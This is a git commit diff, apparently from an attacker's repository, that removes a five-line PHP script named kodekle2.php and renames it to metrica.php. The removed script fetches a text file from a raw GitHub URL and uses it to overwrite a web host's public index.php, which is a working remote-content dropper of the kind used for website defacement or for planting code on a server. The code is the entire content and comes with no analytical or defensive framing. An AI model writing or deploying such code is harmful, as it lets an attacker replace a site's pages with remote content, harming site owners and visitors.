d2e7d54cb01ae78312087ef79fe17d599a175711
0x3d4 <57102297+0x3d4@users.noreply.github.com>
2019-11-17 15:39:09 +0300

    Update and rename kodekle2.php to metrica.php

--- kodekle2.php
+++
@@ -1,5 +0,0 @@
-<?php
-$dosyaicerik = file_get_contents("https://raw.githubusercontent.com/0x3d4/index/master/eski.txt");
-$dosya = fopen('/home/rafya/public_html/index.php', 'w');
-fwrite($dosya, $dosyaicerik);
-fclose($dosya);
